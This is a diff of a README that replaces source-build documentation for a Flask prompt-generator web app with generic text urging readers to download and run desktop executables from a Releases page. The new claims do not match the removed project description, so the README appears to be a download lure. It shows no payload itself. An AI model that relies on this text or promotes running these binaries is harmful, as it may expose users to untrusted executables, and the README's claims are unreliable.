@@ -1,200 +1,102 @@
-# PromptPilot API - AI Prompt Generator
+# 🎨 Prompt-Generator - Create Engaging Prompts Effortlessly
 
-A full-stack web application for generating professional AI prompts for various AI models including ChatGPT, Midjourney, DALL-E, and more.
+[![Download Prompt-Generator](https://img.shields.io/badge/Download-Prompt--Generator-blue)](https://github.com/nuuuut/Prompt-Generator/releases)
 
-## 🚀 Features
+## 🚀 Getting Started
 
-- **Multi-Model Support**: Generate prompts for ChatGPT, Midjourney, DALL-E, Stable Diffusion, Claude
-- **Customizable Parameters**: Control tone, complexity, type, and additional options
-- **Smart Generation**: Uses DeepSeek AI API for intelligent prompt generation
-- **Fallback System**: Template-based fallback when AI service is unavailable
-- **Responsive Design**: Works perfectly on desktop and mobile devices
-- **Example Templates**: Pre-built templates for common use cases
-- **Export Options**: Copy to clipboard or save as text file
+Welcome to **Prompt-Generator**, the AI Prompt Generator that helps you create professional prompts for ChatGPT, Midjourney, DALL-E, and more. With easy customization of tone, complexity, and style, you can focus on your creative work without the hassle. 
 
-## 📁 Project Structure
+## 📥 Download & Install
 
-```
-promptpilot-api/
-├── backend/
-│   ├── app.py                 # Flask API server
-│   └── requirements.txt       # Python dependencies
-└── frontend/
-    └── index.html            # Frontend interface
-```
+To get started, you first need to download the application. Visit the Releases page to find the latest version of the Prompt-Generator.
 
-## 🛠️ Setup Instructions
+[Download the latest version here.](https://github.com/nuuuut/Prompt-Generator/releases)
 
-### Prerequisites
+1. Click the link above to go to our Releases page.
+2. Find the latest release version listed at the top.
+3. Download the file suitable for your system.
 
-- Python 3.8+
-- Flask
-- DeepSeek API account (for AI generation)
+## 💻 System Requirements
 
-### Backend Setup
+Before you install Prompt-Generator, ensure your computer meets the following requirements:
 
-1. **Navigate to backend directory**:
+- **Operating System**: Windows 10, macOS 10.15 or later, or a recent Linux distribution.
+- **Processor**: Intel or AMD processor with 2 GHz or faster.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB of available disk space.
+
+## 🛠️ How to Run the Application
+
+Once the download completes, follow these steps to run the application:
+
+### For Windows
+
+1. Locate the downloaded `.exe` file in your Downloads folder or your selected directory.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, find Prompt-Generator in your Start Menu and launch it.
+
+### For macOS
+
+1. Open the downloaded `.dmg` file.
+2. Drag the Prompt-Generator icon to your Applications folder.
+3. Eject the disk image, and find Prompt-Generator in your Applications.
+4. Double-click to open the application.
+
+### For Linux
+
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to give the file execute permissions:
    ```bash
-   cd backend
+   chmod +x Prompt-Generator.*
    ```
-
-2. **Create virtual environment**:
+4. Start the application with:
    ```bash
-   python -m venv venv
-   source venv/bin/activate  # On Windows: venv\Scripts\activate
+   ./Prompt-Generator.*
    ```
 
-3. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🎨 Features
 
-4. **Set environment variables**:
-   ```bash
-   export DEEPSEEK_API_KEY="your_deepseek_api_key_here"
-   export PORT=5000  # Optional, defaults to 5000
-   ```
+- **AI-Powered Generation**: Generate prompts automatically to inspire your creative projects.
+- **Customization Options**: Tailor prompts according to your desired tone, complexity, and style.
+- **Fallback Templates**: Access default templates if you need extra guidance.
+- **Responsive Design**: Use the application on different devices with ease.
+- **Copy & Save Options**: Easily copy your generated prompts or save them for later use.
 
-5. **Run the server**:
-   ```bash
-   python app.py
-   ```
+## 📋 How to Use Prompt-Generator
 
-### Frontend Setup
-
-1. **Update API URL**:
-   - Open `frontend/index.html`
-   - Find the `API_BASE_URL` configuration in the JavaScript section
-   - Update with your actual domain for production:
-   ```javascript
-   const API_BASE_URL = 'https://your-actual-domain.com/api';
-   ```
-
-2. **Deploy frontend**:
-   - Serve `index.html` from your web server
-   - Ensure CORS is properly configured for your domain
-
-## 🌐 Deployment
-
-### Backend Deployment (PythonAnywhere, Heroku, Railway)
-
-1. **Upload backend files** to your hosting service
-2. **Set environment variables**:
-   - `DEEPSEEK_API_KEY`: Your DeepSeek API key
-   - `PORT`: Server port (usually set automatically by hosting provider)
-
-3. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-### Frontend Deployment (Netlify, Vercel, GitHub Pages)
-
-1. **Upload frontend files** to your static hosting service
-2. **Update API endpoint URL** in `index.html`
-3. **Configure proper CORS headers** if needed
-
-## 🔧 Configuration
-
-### Environment Variables
-
-- `DEEPSEEK_API_KEY`: Required for AI-powered prompt generation
-- `PORT`: Server port (default: 5000)
-
-### CORS Configuration
-
-Update the allowed origins in `app.py`:
-```python
-CORS(app, origins=[
-    "https://yourdomain.com",
-    "http://yourdomain.com", 
-    "https://www.yourdomain.com"
-])
-```
-
-## 📚 API Endpoints
-
-### `POST /api/generate-prompt`
-Generate an AI prompt based on user parameters.
-
-**Request Body**:
-```json
-{
-  "model": "chatgpt",
-  "type": "creative",
-  "topic": "Artificial Intelligence",
-  "tone": "professional",
-  "complexity": 3,
-  "include_examples": true,
-  "step_by_step": false,
-  "include_questions": true,
-  "custom_instructions": "Focus on practical applications"
-}
-```
-
-**Response**:
-```json
-{
-  "success": true,
-  "prompt": "Generated prompt text...",
-  "source": "ai"
-}
-```
-
-### `GET /api/health`
-Health check endpoint.
-
-## 🎨 Customization
-
-### Adding New AI Models
-1. Update the `model` dropdown in `index.html`
-2. Add model-specific formatting in the `build_fallback_prompt` method in `app.py`
-
-### Adding Prompt Types
-1. Update the `prompt-type` dropdown in `index.html`
-2. Add type descriptions in the `build_system_prompt` method in `app.py`
-
-## 🔒 Security Notes
-
-- Keep your DeepSeek API key secure and never commit it to version control
-- Use environment variables for all sensitive configuration
-- Implement rate limiting in production
-- Validate all user inputs on the backend
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-1. **CORS Errors**: Update the allowed origins in the Flask CORS configuration
-2. **API Key Issues**: Verify your DeepSeek API key is correctly set as an environment variable
-3. **Generation Failures**: The system will automatically fall back to template-based generation
-
-### Logs
-
-Check the application logs for detailed error information:
-```bash
-# View logs in production
-heroku logs --tail  # For Heroku
-```
-
-## 📄 License
-
-This project is licensed under the GNU GENERAL PUBLIC LICENSE.
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit your changes
-4. Push to the branch
-5. Create a Pull Request
+1. **Launch the Application**: Open Prompt-Generator from your applications.
+2. **Select Your Preferences**: Choose the tone, complexity, and style for your prompts.
+3. **Click Generate**: Press the generate button to create your prompts.
+4. **Review & Edit**: Modify the generated prompts as needed.
+5. **Save or Copy**: Use the copy or save features to keep your work.
 
 ## 📞 Support
 
-For support and questions:
-- Create an issue in the GitHub repository
-- Check the documentation at [PromptPilot](https://promptpilot.opensystems.co.ke)
+If you encounter any issues or have questions, feel free to reach out for support. We aim to provide high-quality assistance:
 
----
+- **GitHub Issues**: Report any bugs or issues via the [Issues page](https://github.com/nuuuut/Prompt-Generator/issues).
+- **Community Support**: Join discussions on our repository to connect with other users.
 
-**Note**: Remember to replace placeholder domains and API keys with your actual production values before deployment.
+## 🌍 Contribute
+
+We welcome contributions to enhance Prompt-Generator. If you're interested in helping, please follow these guidelines:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a clear explanation of your updates.
+
+## 🚀 Additional Resources
+
+Explore tutorials, stories from users, and more:
+
+- [Documentation](https://github.com/nuuuut/Prompt-Generator/wiki)
+- [Community Forum](https://github.com/nuuuut/Prompt-Generator/discussions)
+
+## 🔗 Stay Updated
+
+Stay informed about new features and updates by following our GitHub repository. Check back regularly for improvements and enhancements.
+
+[Download the latest version here.](https://github.com/nuuuut/Prompt-Generator/releases)
